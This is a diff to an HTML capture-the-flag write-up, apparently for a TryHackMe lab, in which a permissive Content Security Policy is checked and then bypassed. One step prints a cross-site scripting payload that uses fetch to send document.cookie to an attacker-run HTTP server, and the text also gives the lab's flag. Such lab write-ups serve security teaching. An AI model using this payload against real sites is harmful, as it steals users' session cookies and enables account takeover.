@@ -207,9 +207,9 @@ You can access the introduction at http://xx.xxx.xxx.xxx/. </p>
 - navigated to <code>https://csp-evaluator.withgoogle.com</code> to check if the policy has any potential bypass vectors in it<br>
 - pasted <code>xx.xxx.xxx.xxx:30001</code><br>
 - clicked <code>CHECK CSP</code><br>
-- identified that there is <code>default-src</code><br>: <code>*</code> and <code>‘unsafe-inline’</code><br>
+- identified that there is <code>default-src</code>:<br> <code>*</code> and<br><code>‘unsafe-inline’</code><br>
 - checked and identified that the directive <code>default-src</code><br> is used as the default, which means if a certain resource is trying to be loaded and there isn't a directive specified for its type, it falls back to default-src to verify if it's allowed to load.<br>
-- set up an http.server<br>>
+- set up an http.server<br>
 - typed a payload <code><script>fetch(`http://10.201.25.139:8000/${document.cookie}`)</script></code><br>
 - clicked <code>Submit Query</code><br>
 - received the flag and URL decoded it: <code>THM%7BTh4t_W4s_Pr3tty_3asy%7D</code> = <code>THM{Th4t_W4s_Pr3tty_3asy}</code></p>
